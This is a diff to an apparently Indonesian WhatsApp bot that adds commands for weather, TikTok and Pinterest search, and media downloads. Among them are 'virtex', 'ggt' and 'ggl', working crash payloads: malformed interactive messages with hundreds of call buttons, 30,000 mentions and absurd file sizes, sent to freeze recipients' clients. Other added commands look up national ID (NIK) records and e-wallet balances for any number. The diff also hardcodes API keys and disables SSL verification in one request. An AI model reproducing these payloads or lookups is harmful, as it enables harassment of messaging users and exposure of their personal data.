+                    inviteLinkGroupTypeV2: "DEFAULT",
+                    messageContextInfo: {
+                      deviceListMetadata: {
+                        senderTimestamp: "1678285396",
+                        recipientKeyHash: "SV5H7wGIOXqPtg==",
+                        recipientTimestamp: "1678496731",
+                        deviceListMetadataVersion: 2
+                      }
+                    }
+                  },
+                  contextInfo: {
+            mentionedJid: [m.sender],
+            forwardingScore: 999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+                newsletterName: "Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦",
+                newsletterJid: "120363373320014871@newsletter",
+                serverMessageId: 143
+            }
+        }
+                }
+              }
+            }
+          },{ userJid: m.chat, quoted: fkontak });
+        }
+        break
+        
+        case 'ggt': {
+    await sych.relayMessage(m.chat, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "Halo Bro",
+                        format: "EXTENSIONS_1"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: 'galaxy_message',
+                        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                        version: 3
+                    }
+                }
+            }
+        }
+    }, 
+{ userJid: m.chat, quoted: fkontak });
+}
+break;
+        case 'virtex': {
+    try {
+        let virtex = "Cella";
+        let buttons = Array.from({ length: 200 }, () => ({
+            name: 'call_permission_request',
+            buttonParamsJson: '{}'
+        }));
+        let overJids = Array.from({ length: 5 }, () => m.chat); // Batasi jumlah untuk mencegah crash
+
+        await sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            documentMessage: {
+                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                                fileLength: "999999999",
+                                pageCount: 1, // Set nilai yang realistis
+                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                                fileName: virtex,
+                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                                mediaKeyTimestamp: Date.now() / 1000, // Gunakan timestamp yang benar
+                                contactVcard: true
+                            },
+                            title: "haha",
+                            hasMediaAttachment: true
+                        },
+                        body: {
+                            text: "hshsh"
+                        },
+                        nativeFlowMessage: {},
+                        contextInfo: {
+                            mentionedJid: overJids,
+                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Xinn" }]
+                        }
+                    }
+                }
+            },
+            contextInfo: {
+                mentionedJid: overJids,
+                externalAdReply: {
+                    showAdAttribution: true,
+                    renderLargerThumbnail: false,
+                    title: "-> .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ ",
+                    body: "—??",
+                    previewType: "VIDEO",
+                    thumbnail: "",
+                    sourceUrl: "https://byxzmods.com",
+                    mediaUrl: "https://byxzmods.com"
+                }
+            }
+        },{ userJid: m.chat, quoted: fkontak });
+
+        console.log(chalk.green("Cella Bot | Virtex Sent Successfully"));
+    } catch (error) {
+        console.error(chalk.red("Cella Bot | Error Sending Virtex: "), error);
+    }
+};
+break;
+        
+case 'ggl': {
+
+    
+        let menu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome ke katalog kami!`;
+
+        // Membuat pesan katalog dengan gambar eksternal
+let msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2
+            },
+            productMessage: {
+                product: {
+                    productImage: {
+                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPO0xx8wj-yC22H5a8y77wnqiuDocaXKcWwrM7NdXp3qrCIlyfg8DOrl_rdyjmnsHd7DuxbflVI6sagEtFf-phCVDQymWsdDMT570nfxA?ccb=9-4&oh=01_Q5AaIJgQB7je7zNYpSKyrZereWgyMw4vd-lwYeo0U_0gAQhh&oe=67C79978&_nc_sid=e6ed6c&mms3=true",
+                        mimetype: "image/jpeg",
+                        fileSha256: "T3/s9mIeDZaVkg3TVeEDWwOPdEIcY5pOWbNTuU8LZLk=",
+                        fileEncSha256: "MUT7J+sx3ySh4a49wxlhqoxI1LbOGV6JrId49oCGvoc=",
+                        mediaKey: "Pg5gueOYm9s7ENS74rtF88IuBa1vcyVBcmznZm3PiNE=",
+                        fileLength: { low: 14892, high: 0, unsigned: true },
+                        height: 500,
+                        width: 500,
+                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k="
+                    },
+                    productId: "9103360316413843",
+                    currencyCode: "USD",
+                    priceAmount1000: { low: 1316133912, high: 2328, unsigned: false },
+                    title: "RKA STORE ©Powered by Langz",
+                    description: "RKA STORE\n\n" +
+    "Halo Welcome\n" +
+    "RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n" +
+    "RKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n" +
+    "Daftar kategori produk yang tersedia di bawah ini:\n\n" +
+    "╭─❍「 Game Populer 」❍\n" +
+    "│✧ MLBB\n" +
+    "│✧ ML_WDP\n" +
+    "│✧ ML_SL\n" +
+    "│✧ ML_TL\n" +
+    "│✧ Hok\n" +
+    "│✧ AOV\n" +
+    "│✧ LOL\n" +
+    "│✧ COC\n" +
+    "│✧ FF\n" +
+    "│✧ PUBG\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Data Internet 」❍\n" +
+    "│✧ BYU DATA\n" +
+    "│✧ TELKOMSEL DATA\n" +
+    "│✧ XL DATA\n" +
+    "│✧ AXIS DATA\n" +
+    "│✧ ISAT DATA\n" +
+    "│✧ TRI DATA\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Pulsa Reguler & Transfer 」❍\n" +
+    "│✧ BYU PULSA\n" +
+    "│✧ TELKOMSEL PULSA\n" +
+    "│✧ XL PULSA\n" +
+    "│✧ AXIS PULSA\n" +
+    "│✧ ISAT PULSA\n" +
+    "│✧ TRI PULSA\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Voucher 」❍\n" +
+    "│✧ PLN\n" +
+    "╰────❍",
+                    productImageCount: 1
+                },
+                businessOwnerJid: "17089003182@s.whatsapp.net",
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    }
+                    }
+            }
+        }
+    }
+}, { quoted: m });
+await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
+
+        let locationMsg = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    "newsletterAdminInviteMessage": {
+                        "newsletterJid": `120363396726721623@newsletter`,
+                        "newsletterName": "virtex",
+                        "jpegThumbnail":  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k=", // Menggunakan Uint8Array yang valid
+                        "caption": "> virtex",
+                        serverMessageId: 143,
+                        "inviteExpiration": Date.now() + 1814400000 // 3 hari dari sekarang
+                    }
+                }
+            }
+        }, { userJid: m.chat, quoted: fkontak });
+
+
+    await sych.relayMessage(m.chat, locationMsg.message, { messageId: locationMsg.key.id });
+   
+        
+    await sych.relayMessage(
+        m.chat,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            documentMessage: {
+                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                                fileLength: "9999999999999",
+                                pageCount: 1316134911,
+                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                                fileName: "🦄드림 가이 Xeon",
+                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                                mediaKeyTimestamp: "1726867151",
+                                contactVcard: true,
+                                jpegThumbnail: ""
+                            }
+                        },
+                        body: {
+                            text: "Powered by Langz\n@916909137213"
+                        },
+                        nativeFlowMessage: {
+                            buttons: [
+                                {
+                                    name: "cta_url",
+                                    buttonParamsJson: `{
+                                        "display_text": "🦄드림 가이 Xeon",
+                                        "url": "https://youtube.com/dgxeon",
+                                        "merchant_url": "https://youtube.com/dgxeon"
+                                    }`
+                                },
+                                {
+                                    name: "call_permission_request",
+                                    buttonParamsJson: "{}"
+                                }
+                            ],
+                            messageParamsJson: "{}"
+                        },
+                        contextInfo: {
+                            mentionedJid: [
+                                "916909137213@s.whatsapp.net",
+                                ...Array.from(
+                                    { length: 30000 },
+                                    () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                                )
+                            ],
+                            forwardingScore: 1,
+                            isForwarded: true,
+                            fromMe: false,
+                            participant: "0@s.whatsapp.net",
+                            remoteJid: "status@broadcast",
+                            quotedMessage: {
+                                documentMessage: {
+                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                                    fileLength: "9999999999999",
+                                    pageCount: 1316134911,
+                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                                    fileName: "🦄드림 가이 Xeon",
+                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                                    mediaKeyTimestamp: "1724474503",
+                                    contactVcard: true,
+                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                                    jpegThumbnail: ""
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        },
+        { userJid: m.chat, quoted: fkontak }
+    );
+}
+break;
+
+case 'ceknik': {
+    if (!args[0]) return sycreply(`Masukkan NIK yang ingin dicek!\n\nContoh: *${prefix}ceknik 1671030502030006*`);
+
+    let nik = args[0];
+    let apiUrl = `https://api.autoresbot.com/api/database/ceknik?apikey=21909c8cc878c2dd482ac9672585b622&nik=${nik}`;
+
+    try {
+        let response = await fetch(apiUrl);
+        let result = await response.json();
+
+        if (result.message !== "NIK valid") {
+            return sycreply(`⚠️ NIK tidak ditemukan atau tidak valid.`);
+        }
+
+        let data = result.data;
+        let text = `*🔍 Hasil Pengecekan NIK*\n\n`
+            + `✅ *Status:* ${result.message}\n`
+            + `🏙️ *Provinsi:* ${data.provinsi}\n`
+            + `🏡 *Kabupaten/Kota:* ${data.kabupaten}\n`
+            + `🏠 *Kecamatan:* ${data.kecamatan}\n`
+            + `🎂 *Tanggal Lahir:* ${data.tgl_lahir}\n`
+            + `🚻 *Jenis Kelamin:* ${data.jenis_kelamin}`;
+
+        sycreply(text);
+    } catch (error) {
+        sycreply(`⚠️ Terjadi kesalahan saat mengambil data.\n\n${error}`);
+    }
+    break;
+}
+
+case 'cekewallet': {
+    if (!args[0]) return sycreply(`Silakan masukkan nomor e-wallet!\n\nContoh: *${prefix}cekewallet 6282280993065*`);
+
+    let nomor = args[0];
+    let apikey = 'a0ffffce7bcb95cca11a2e61';
+    let url = `https://api.autoresbot.com/api/database/ewallet?apikey=${apikey}&number=${nomor}`;
+
+    try {
+        let response = await fetch(url);
+        let data = await response.json();
+
+        if (data.status && data.result) {
+            let info = `*🔍 Cek Saldo E-Wallet*\n\n` +
+                       `📌 *Nomor*: ${nomor}\n` +
+                       `💰 *Saldo*: ${data.result.saldo}\n` +
+                       `📅 *Update*: ${data.result.last_update}\n\n` +
+                       `✅ Data berhasil diperoleh.`;
+            sycreply(info);
+        } else {
+            sycreply(`⚠️ Data tidak ditemukan atau terjadi kesalahan.`);
+        }
+    } catch (error) {
+        console.error(error);
+        sycreply(`❌ Terjadi kesalahan saat menghubungi API.`);
+    }
+    break;
+}
+case 'kodepos': {
+    if (!args.length) return sycreply(`Silakan masukkan nama daerah!\n\nContoh: *${prefix}kodepos pasiran jaya*`);
+
+    let daerah = args.join(' '); // Menggabungkan argumen dengan spasi
+    let url = `https://api.siputzx.my.id/api/tools/kodepos?form=${daerah}`;
+
+    try {
+        let response = await fetch(url);
+        let data = await response.json();
+
+        console.log(data);  // Menambahkan log untuk melihat respons API
+
+if (data.status && data.data && data.data.length > 0) {
+    let info = `*🔍 Cek Kode Pos*\n\n` +
+               `📌 *Daerah*: ${daerah}\n` +
+               `📬 *Kode Pos*: ${data.data[0].kodepos}\n` +
+               `📍 *Desa*: ${data.data[0].desa}\n` +
+               `🏙️ *Kecamatan*: ${data.data[0].kecamatan}\n` +
+               `🌆 *Kota*: ${data.data[0].kota}\n` +
+               `🏞️ *Provinsi*: ${data.data[0].provinsi}\n\n` +
+               `✅ Data berhasil diperoleh.`;
+    sycreply(info);
+} else {
+    sycreply(`⚠️ Data tidak ditemukan atau terjadi kesalahan. Pastikan nama daerah benar.`);
+}
+    } catch (error) {
+        console.error(error);
+        sycreply(`❌ Terjadi kesalahan saat menghubungi API.`);
+    }
+    break;
+}
+
+case 'tiktok2': {
+    if (!args.length) return sycreply(`Silakan masukkan kata kunci pencarian!\n\nContoh: *${prefix}tiktok2 garam*`);
+
+    let query = args.join(' '); // Menggabungkan argumen menjadi query
+    let url = `https://api.diioffc.web.id/api/search/tiktok?query=${query}`;
+
+    try {
+        let response = await fetch(url);
+        let data = await response.json();
+
+        console.log(data);  // Menambahkan log untuk melihat respons API
+
+        if (data.status && data.result && data.result.length > 0) {
+            let text = `Hasil pencarian TikTok untuk: ${query}`;
+            let anu = data.result.map(item => item.thumbnail); // Mengambil URL thumbnail dari hasil API
+
+            // Menyusun carousel cards untuk hasil pencarian
+            const carouselCards = await Promise.all(anu.slice(0, 10).map(async (url, index) => ({
+                header: {
+                    title: `Video ${index + 1}`,
+                    hasMediaAttachment: true,
+                    imageMessage: (await generateWAMessageContent({
+                        image: { url }
+                    }, {
+                        upload: sych.waUploadToServer
+                    })).imageMessage
+                },
+                body: {
+                    text: `Judul: ${data.result[index].title}\nDurasi: ${data.result[index].duration}s`
+                },
+                footer: {
+                    text: `Video TikTok oleh: ${data.result[index].author.name}`
+                },
+                nativeFlowMessage: {
+                    buttons: [{
+                        "name": "cta_url",
+                        "buttonParamsJson": JSON.stringify({
+                            display_text: "Tonton di TikTok",
+                            url: `https://www.tiktok.com/@${data.result[index].author.username}/video/${data.result[index].video_id}`
+                        })
+                    }]
+                }
+            })));
+
+            // Membuat pesan carousel
+            const carouselMessage = generateWAMessageFromContent(m.chat, {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+                            body: {
+                                text: `Hasil pencarian untuk: ${query}`
+                            },
+                            footer: {
+                                text: "_Powered by Galangxyz_"
+                            },
+                            header: {
+                                hasMediaAttachment: false
+                            },
+                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                                cards: carouselCards
+                            })
+                        })
+                    }
+                }
+            }, {});
+
+            // Mengirim pesan carousel
+            await sych.relayMessage(m.chat, carouselMessage.message, {
+                messageId: carouselMessage.key.id
+            });
+        } else {
+            sycreply(`⚠️ Tidak ada hasil ditemukan untuk "${query}".`);
+        }
+    } catch (error) {
+        console.error("Kesalahan saat mengirim carousel:", error);
+        sycreply(`❌ Terjadi kesalahan saat memproses permintaan.`);
+    }
+    break;
+}
+
+
+			case 'pin': {
+    if (!args.length) return sycreply(`Silakan masukkan kata kunci pencarian!\n\nContoh: *${prefix}pin gojo*`);
+
+    let query = args.join(' '); // Menggabungkan argumen menjadi query
+    let url = `https://api.diioffc.web.id/api/search/pinterest?query=${query}`;
+
+    try {
+        let response = await fetch(url);
+        let data = await response.json();
+
+        console.log(data);  // Menambahkan log untuk melihat respons API
+
+        if (data.status && data.result && data.result.length > 0) {
+            let text = `Hasil pencarian Pinterest untuk: ${query}`;
+            let anu = data.result.map(item => item.src); // Mengambil URL gambar dari hasil API
+
+            // Menyusun carousel cards untuk hasil pencarian
+            const carouselCards = await Promise.all(anu.slice(0, 10).map(async (url, index) => ({
+                header: {
+                    title: `Hasil ${index + 1}`,
+                    hasMediaAttachment: true,
+                    imageMessage: (await generateWAMessageContent({
+                        image: { url }
+                    }, {
+                        upload: sych.waUploadToServer
+                    })).imageMessage
+                },
+                body: {
+                    text: `Hasil pencarian Pinterest untuk: ${query}`
+                },
+                footer: {
+                    text: "Klik tombol di bawah untuk melihat sumber."
+                },
+                nativeFlowMessage: {
+                    buttons: [{
+                        "name": "cta_url",
+                        "buttonParamsJson": JSON.stringify({
+                            display_text: "Lihat di Pinterest",
+                            url: `https://www.pinterest.com/pin/${data.result[index].link.split('/')[4]}`
+                        })
+                    }]
+                }
+            })));
+
+            // Membuat pesan carousel
+            const carouselMessage = generateWAMessageFromContent(m.chat, {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+                            body: {
+                                text: `Hasil pencarian untuk: ${query}`
+                            },
+                            footer: {
+                                text: "_Powered By Galangxyz_"
+                            },
+                            header: {
+                                hasMediaAttachment: false
+                            },
+                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                                cards: carouselCards
+                            })
+                        })
+                    }
+                }
+            }, {});
+
+            // Mengirim pesan carousel
+            await sych.relayMessage(m.chat, carouselMessage.message, {
+                messageId: carouselMessage.key.id
+            });
+        } else {
+            sycreply(`⚠️ Tidak ada hasil ditemukan untuk "${query}".`);
+        }
+    } catch (error) {
+        console.error("Kesalahan saat mengirim carousel:", error);
+        sycreply(`❌ Terjadi kesalahan saat memproses permintaan.`);
+    }
+    break;
+}
+
+case 'cuaca': {
+    if (!args.length) return sycreply(`Silakan masukkan nama kota!\n\nContoh: *${prefix}cekcuaca Palembang*`);
+
+    let city = args.join(' '); // Menggabungkan argumen menjadi nama kota
+    let url = `https://api.diioffc.web.id/api/tools/cekcuaca?query=${city}`;
+
+    try {
+        let response = await fetch(url);
+        let data = await response.json();
+
+        console.log(data);  // Menambahkan log untuk melihat respons API
+
+        if (data.status && data.result) {
+            let weather = data.result.weather[0];
+            let main = data.result.main;
+            let wind = data.result.wind;
+            let sys = data.result.sys;
+
+            let weatherDescription = weather.description;
+            let temperature = main.temp;
+            let feelsLike = main.feels_like;
+            let minTemp = main.temp_min;
+            let maxTemp = main.temp_max;
+            let humidity = main.humidity;
+            let windSpeed = wind.speed;
+            let windDegree = wind.deg;
+            let cityName = data.result.name;
+            let sunrise = new Date(sys.sunrise * 1000).toLocaleTimeString();
+            let sunset = new Date(sys.sunset * 1000).toLocaleTimeString();
+
+            // Membuat teks cuaca
+            let weatherText = `
+Cuaca di *${cityName}*:
+🌤️ *${weather.main}* - ${weatherDescription}
+🌡️ Suhu: ${temperature}°C (Feels like: ${feelsLike}°C)
+🌡️ Suhu Min: ${minTemp}°C, Suhu Max: ${maxTemp}°C
+💧 Kelembapan: ${humidity}%
+💨 Kecepatan Angin: ${windSpeed} m/s
+🕒 Matahari Terbit: ${sunrise}
+🕕 Matahari Terbenam: ${sunset}
+            `;
+
+            sycreply(weatherText);
+        } else {
+            sycreply(`⚠️ Tidak ada data cuaca ditemukan untuk kota "${city}".`);
+        }
+    } catch (error) {
+        console.error("Kesalahan saat mengakses data cuaca:", error);
+        sycreply(`❌ Terjadi kesalahan saat memproses permintaan cuaca.`);
+    }
+    break;
+}
 //xnxx
 
 case 'ww':
 case 'werewolf': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 let jimp = require("jimp")
 const resize = async (image, width, height) => {
     const read = await jimp.read(image);
@@ -5961,7 +14782,7 @@ let {
 break
 //==================================================================
 case 'setpppanjang': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 const jimp_1 = require('jimp')
 async function pepe(media) {
 	const jimp = await jimp_1.read(media)
@@ -6008,7 +14829,7 @@ async function pepe(media) {
 break
 //==================================================================
 case 'setpppgcanjang': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 const jimp_1 = require('jimp')
 async function pepe(media) {
 	const jimp = await jimp_1.read(media)
@@ -6054,7 +14875,7 @@ async function pepe(media) {
 break
 //=========================================\\
 case 'tenor': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 function isValidURL(message) {
     const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
     return urlPattern.test(message);
@@ -6112,7 +14933,7 @@ break
 //capcut
 
 case 'capcut': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) {
         await sych.sendMessage(m.chat, { text: `Contoh: ${prefix + command} https://www.capcut.com/videoId` }, { quoted: fkontak });
         break;
@@ -6160,7 +14981,7 @@ case 'capcut': {
 
 //facebook
 case 'facebook': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) {
         await sych.sendMessage(m.chat, { 
             text: `Contoh penggunaan:\n${prefix + command} https://www.facebook.com/share/r/12BFZAtjpS8/?mibextid=qDwCgo` 
@@ -6229,7 +15050,7 @@ case 'facebook': {
 
 //spotify
 case 'spo': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) {
         await sych.sendMessage(m.chat, { 
             text: `Contoh penggunaan:\n${prefix + command} https://open.spotify.com/track/4cPqgJcFAwA0v6dQk3DlMc` 
@@ -6332,7 +15153,7 @@ case 'spo': {
 
 //image google
 case 'gooimage': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) {
         await sych.sendMessage(m.chat, { 
             text: `Contoh penggunaan:\n${prefix + command} siputzx` 
@@ -6382,7 +15203,7 @@ case 'gooimage': {
 
 
 			case 'play3': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text) return sycreply(`*< / >* Example: ${prefix + command} dj komang`);
     sycreply(mess.wait);
 
@@ -6482,8 +15303,181 @@ try {
     }
 }
 break;
+
+//xnxx download
+
+case 'xnxxdl': {
+    if (!isRegistered) {
+        return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+    }
+
+    if (!text) {
+        await sych.sendMessage(m.chat, { 
+            text: `Contoh penggunaan:\n${prefix + command} https://www.xnxx.com/video-141ewlbb/gojosotoru`
+        }, { quoted: fkontak });
+        break;
+    }
+
+    if (!text.includes('xnxx.com/video-')) {
+        await sych.sendMessage(m.chat, { 
+            text: 'Link yang kamu masukkan bukan link video xnxx! 😅' 
+        }, { quoted: m });
+        break;
+    }
+
+    try {
+        await sych.sendMessage(m.chat, { 
+            text: '⏳ Sedang memproses video...' 
+        }, { quoted: fkontak });
+
+        // Panggil API untuk mendapatkan link download
+        const apiUrl = `https://api.zxcoderid.my.id/api/downloader/xnxx?url=${encodeURIComponent(text)}&apikey=lHW7OGsA67`;
+
+        // Opsi untuk menonaktifkan verifikasi SSL
+        const response = await fetch(apiUrl, {
+            agent: new (require('https').Agent)({ rejectUnauthorized: false }) // Menonaktifkan verifikasi SSL
+        });
+
+        const data = await response.json();
+
+        if (data.status !== "Success" || !data.data?.files) {
+            await sych.sendMessage(m.chat, { 
+                text: 'Gagal mendapatkan video. Coba lagi nanti!' 
+            }, { quoted: fkontak });
+            break;
+        }
+
+        // Ambil URL video dari hasil API
+        const { files } = data.data;
+        const videoUrls = {
+            low: files.low,   // URL kualitas rendah
+            high: files.high, // URL kualitas tinggi
+            hls: files.HLS    // URL HLS (jika ada)
+        };
+
+        // Periksa jika URL video tersedia untuk masing-masing kualitas
+        if (!videoUrls.low && !videoUrls.high && !videoUrls.hls) {
+            await sych.sendMessage(m.chat, { 
+                text: 'Gagal menemukan link video dengan kualitas yang tersedia.' 
+            }, { quoted: fkontak });
+            break;
+        }
+
+        // Membuat pesan dengan semua pilihan kualitas video
